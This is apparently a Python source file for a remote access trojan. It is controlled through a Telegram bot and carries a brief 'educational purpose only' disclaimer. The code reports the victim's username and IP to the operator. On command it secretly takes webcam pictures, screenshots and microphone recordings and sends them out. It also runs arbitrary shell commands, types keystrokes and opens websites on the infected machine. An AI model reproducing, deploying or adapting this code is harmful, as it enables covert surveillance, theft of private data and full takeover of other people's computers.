import sys
import webbrowser
import psutil
import pyttsx3
import requests
import getpass
import os
import cv2
from PIL import ImageGrab
import pyaudio, wave
from easygui import *
from telegram import InlineKeyboardButton, InlineKeyboardMarkup,ParseMode
from telegram.ext import Updater, CommandHandler, CallbackQueryHandler
import flag
import platform
import subprocess
import autopy
import random

'''
This Program is only for educational purpose only I am not responsible how this program is used

Developed by Henry Richard J

If you Like this project consider making a donation

Thank you for using this project !

'''


username = getpass.getuser() # To get USERNAME of the PC
telegram_parsing_mode = ParseMode.HTML

my_id = '<Replace With Your Chat ID>' # Enter Your Chat ID
bot_api = '<Replace With Your Telegram BOT ID>' # Enter your Telegram BOT Api

ip = requests.get("http://ip-api.com/json/").json() # Getting Public IP details in Json Format

def SpeakText(command):

    engine = pyttsx3.init()
    engine.say(command)
    engine.runAndWait()


def listToString(s):

    str1 = " "
    return (str1.join(s))

updater = Updater(bot_api, use_context=True)
dispatcher = updater.dispatcher
dispatcher.bot.send_message(chat_id=my_id,text=username+" Connected")

def webcam_taker():
    camera = cv2.VideoCapture(0)
    while True:
        return_value, image = camera.read()
        gray = cv2.cvtColor(image, cv2.COLOR_BGR2GRAY)
        if cv2.waitKey(1):
            cv2.imwrite('webcam.jpg', image)
            break
    camera.release()
    cv2.destroyAllWindows()
    dispatcher.bot.send_document(chat_id=my_id,caption=username+"'s Webcam Snap", document=open('webcam.jpg', 'rb'))
    os.remove('webcam.jpg')

def take_screen_shot():
    screenshot = ImageGrab.grab()
    screenshot.save('screenshot.jpg')
    dispatcher.bot.send_document(chat_id=my_id,caption=username+"'s Screenshot", document=open('screenshot.jpg', 'rb'))
    os.remove('screenshot.jpg')

def recorder():
    FORMAT = pyaudio.paInt16
    CHANNELS = 2
    RATE = 44100
    CHUNK = 1024
    RECORD_SECONDS = 5 # Here you can change the time for recording audio in seconds
    WAVE_OUTPUT_FILENAME = "file.wav"

    audio = pyaudio.PyAudio()

    # start Recording
    stream = audio.open(format=FORMAT, channels=CHANNELS,
                        rate=RATE, input=True,
                        frames_per_buffer=CHUNK)
    frames = []

    for i in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
        data = stream.read(CHUNK)
        frames.append(data)

    # stop Recording
    stream.stop_stream()
    stream.close()
    audio.terminate()

    waveFile = wave.open(WAVE_OUTPUT_FILENAME, 'wb')
    waveFile.setnchannels(CHANNELS)
    waveFile.setsampwidth(audio.get_sample_size(FORMAT))
    waveFile.setframerate(RATE)
    waveFile.writeframes(b''.join(frames))
    waveFile.close()

    dispatcher.bot.send_audio(chat_id=my_id,caption=username+" Audio Logs",audio=open(WAVE_OUTPUT_FILENAME, 'rb'))



def speak(update,context):
  inputs = (update.message.text).split()
  Crt_values = inputs[1:]
  SpeakText(listToString(Crt_values))


def get_system_info():
    my_system = platform.uname()
    gigabyte = float(1024 * 1024 * 1024)

    mem = psutil.virtual_memory()
    mem_total = float(mem.total / gigabyte)
    mem_free = float(mem.free / gigabyte)
    mem_used = float(mem.used / gigabyte)

    hdd = psutil.disk_usage('/')
    HDD_total = hdd.total / gigabyte
    HDD_Used = hdd.used / gigabyte
    HDD_Free = hdd.free / gigabyte

    dispatcher.bot.send_message(chat_id=my_id,text=f"<b>-------🧰 Hardware Info-----</b>\n\n"
                                                   f"📍 System --> {my_system.system}\n"
                                                   f"📍 Name --> {my_system.node}\n"
                                                   f"📍 Release --> {my_system.release}\n"
                                                   f"📍 Version --> {my_system.version}\n"
                                                   f"📍 Machine --> {my_system.machine}\n"
                                                   f"📍 Processor --> {my_system.processor}\n\n"
                                                   f"<b>-------📁 Memory Info-----</b>\n\n"
                                                   f"📍 Memory Total --> {round(mem_total)} GB\n"
                                                   f"📍 Free Memory --> {round(mem_free)} GB\n"
                                                   f"📍 Used Memory --> {round(mem_used)} GB\n\n"
                                                   f"-------<b>💿 Hard Disk Info-----</b>\n\n"
                                                   f"📍 Total HDD --> {round(HDD_total)} GB\n"
                                                   f"📍 Used HDD --> {round(HDD_Used)} GB\n"
                                                   f"📍 Free HDD --> {round(HDD_Free)} GB\n",parse_mode=telegram_parsing_mode)



def msg_From_Server(update,context):
    inputs = (update.message.text).split()
    Crt_values = inputs[1:]
    client_Message = enterbox(listToString(Crt_values),title="Reply to server")
    print(client_Message)
    if client_Message != "":
        dispatcher.bot.send_message(chat_id=my_id, text=username +": "+client_Message)

def shell_commands(update,context):

    inputs = (update.message.text).split()
    command = listToString(inputs[1:])
    cmd_output = subprocess.Popen(f"{command}", shell=True, stdout=subprocess.PIPE)
    dispatcher.bot.send_message(chat_id=my_id,text=cmd_output.stdout.read().decode(sys.stdout.encoding))


def open_website(update,context):
    inputs = (update.message.text).split()
    website = listToString(inputs[1:])
    webbrowser.open(f"{website}")

def move_mouse():
    autopy.mouse.smooth_move(random.randrange(1, 500), random.randrange(1, 500))

def send_keypress(update,context):
    inputs = (update.message.text).split()
    keypress = listToString(inputs[1:])
    autopy.key.type_string(keypress)



def main_menu(update,context):

    keyboard = [[InlineKeyboardButton("Get IP", callback_data='Get_IP')],
                 [InlineKeyboardButton("Get Screenshot", callback_data='get_Screenshot')],
                [InlineKeyboardButton("Get Pic From Webcam", callback_data='get_Webcam')],
                [InlineKeyboardButton("Eavesdrop",callback_data='eavesdrop')],
                [InlineKeyboardButton("Text To Speech on client",callback_data='Speak')],
                [InlineKeyboardButton("Send Message To Client",callback_data='sendMessage')],
                [InlineKeyboardButton("Get System Information",callback_data='get_system_info')],
                [InlineKeyboardButton("Perform Shell Commands",callback_data='shell_commands')],
                [InlineKeyboardButton("Open Website",callback_data='open_website')],
                [InlineKeyboardButton("Move mouse randomly and Slowly",callback_data='move_mouse')],
                [InlineKeyboardButton("Type String",callback_data='send_keypress')]]

    reply_markup = InlineKeyboardMarkup(keyboard)

    update.message.reply_text('Select a Payload :', reply_markup=reply_markup)



def button(update, context):
    query = update.callback_query
    query.answer()
    result = query.data

    if result == 'get_Webcam':
        webcam_taker()
    elif result == 'Get_IP':
        context.bot.send_message(chat_id=my_id,
                                 text="⭕ IP Address : " + ip["query"] + "\n⭕ Country : " + ip["country"]+ " " +flag.flag(ip["countryCode"]) + "\n⭕ Region : " +
                                      ip["regionName"] + "\n⭕ City : " + ip["city"])
    elif result == 'get_Screenshot':
        take_screen_shot()

    elif result == 'shell_commands':
        context.bot.send_message(chat_id=my_id,
                                 text="Use the command '/shell <The command>' to perform shell command on client")

    elif result == 'eavesdrop':
        context.bot.send_message(chat_id=my_id,text="Please wait for 5 seconds recording.........")
        recorder()

    elif result == 'get_system_info':
        get_system_info()

    elif result == 'Speak':
        context.bot.send_message(chat_id=my_id,
                                 text="Use the command '/speak <The text to speak>' to perform text to speech on client")

    elif result == 'sendMessage':
        context.bot.send_message(chat_id=my_id,
                                 text="Use the command '/send_message <The message to send>' to perform text to speech on client")

    elif result == 'open_website':
        context.bot.send_message(chat_id=my_id,
                                 text="Use the command '/open_website <https:// or http://(The Website)>' to open the website on client")

    elif result =='move_mouse':
        move_mouse()
        context.bot.send_message(chat_id=my_id,
                                 text="✅️ Done!")

    elif result == 'send_keypress':
        context.bot.send_message(chat_id=my_id,
                                 text="Use the command '/send_keypress <The string to send>' to type in client")


updater.dispatcher.add_handler(CommandHandler('speak', speak))
updater.dispatcher.add_handler(CommandHandler('send_message', msg_From_Server))
updater.dispatcher.add_handler(CommandHandler('commands',main_menu))
updater.dispatcher.add_handler(CommandHandler('shell',shell_commands))
updater.dispatcher.add_handler(CommandHandler('open_website',open_website))
updater.dispatcher.add_handler(CommandHandler('send_keypress',send_keypress))
updater.dispatcher.add_handler(CallbackQueryHandler(button))
updater.start_polling()
updater.idle()
